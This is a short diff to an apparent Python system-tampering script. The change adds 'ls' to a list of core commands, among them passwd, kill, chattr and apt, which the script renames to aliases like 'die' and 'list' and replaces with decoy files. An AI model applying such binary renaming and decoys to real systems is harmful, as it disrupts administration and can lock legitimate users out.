@@ -56,8 +56,8 @@ if __name__ == "__main__":
         files = os.listdir(directory)   
     except FileNotFoundError:
         print(f"Error: Directory '{directory}' not found.")
-    commands = ["chattr", "passwd", "mv", "kill", "skill", "pkill", "xkill", "find", "killall", "apt"]
-    renamed_commands = ["charge", "pass", "move", "die", "sdie", "pdie", "xdie", "search", "dieall", "trigger"]
+    commands = ["chattr", "passwd", "mv", "kill", "skill", "pkill", "xkill", "find", "killall", "apt", "ls"]
+    renamed_commands = ["charge", "pass", "move", "die", "sdie", "pdie", "xdie", "search", "dieall", "trigger", "list"]
     for i in range(len(commands)):
         change_command_name(commands[i], renamed_commands[i])
         create_decoy_file(commands[i])
